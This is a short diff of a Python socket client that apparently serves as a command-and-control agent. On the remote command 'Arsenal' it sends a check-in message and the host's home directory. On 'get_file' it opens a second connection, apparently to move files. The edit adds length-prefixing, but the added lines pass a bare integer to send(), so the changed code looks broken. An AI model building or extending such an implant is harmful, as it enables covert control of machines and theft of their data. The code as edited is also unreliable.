@@ -15,8 +15,12 @@ def main():
             received = s.recv(buff).strip().split()
             command = [ str(x, 'utf-8') for x in received ]
             if 'Arsenal' in command:
-                s.send(b'Client initial checkin\n')
-                s.send(bytes("Homedir: " + os.environ.get('HOME'), "utf-8"))
+                output = b'Client initial checkin\n'
+                s.send(len(output))
+                s.send(output)
+                output = bytes("Homedir: " + os.environ.get('HOME'), "utf-8")
+                s.send(len(output))
+                s.send(output)
             elif 'get_file' in command:
                 fs=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 fs.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
